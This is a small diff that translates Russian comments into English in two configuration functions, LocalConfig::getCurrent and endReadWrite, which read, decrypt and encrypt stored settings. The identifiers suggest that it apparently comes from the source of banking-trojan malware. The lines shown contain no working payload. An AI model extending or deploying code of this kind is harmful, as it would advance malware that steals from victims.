@@ -30,7 +30,7 @@ BinStorage::STORAGE *LocalConfig::getCurrent(void)
   void *data;
   DWORD dataSize;
 
-  //Получем зашифрованные данные.
+  //Obtain the encrypted data.
   {
     DWORD type;
 
@@ -43,7 +43,7 @@ BinStorage::STORAGE *LocalConfig::getCurrent(void)
     }
   }
 
-  //Получаем конфиг.
+  //Obtain the configuration.
   {
     PESETTINGS pes;
     Core::getPeSettings(&pes);
@@ -79,7 +79,7 @@ bool LocalConfig::endReadWrite(BinStorage::STORAGE *binStorage)
   bool r = false;
   if(binStorage != NULL && coreData.integrityLevel > Process::INTEGRITY_LOW)
   {
-    //Шифруем.
+    //Encrypt.
     PESETTINGS pes;
     Core::getPeSettings(&pes);
       
